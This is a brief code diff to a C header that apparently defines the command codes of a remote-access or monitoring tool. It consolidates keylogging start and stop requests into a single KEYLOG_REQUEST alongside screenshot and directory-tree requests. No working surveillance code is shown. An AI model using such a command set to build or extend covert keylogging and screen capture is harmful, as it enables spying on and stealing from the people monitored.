@@ -18,8 +18,7 @@
 
 #define SCREENSHOT_REQUEST ((1 << 4) | (1 << 3) | (1 << 0))
 
-#define START_KEYLOG_REQUEST ((1 << 5) | (1 << 0))
-#define STOP_KEYLOG_REQUEST ((1 << 5) | (1 << 1))
+#define KEYLOG_REQUEST ((1 << 5) | (1 << 0))
 
 #define DIR_TREE_REQUEST ((1 << 5) | (1 << 3) | (1 << 0))
 
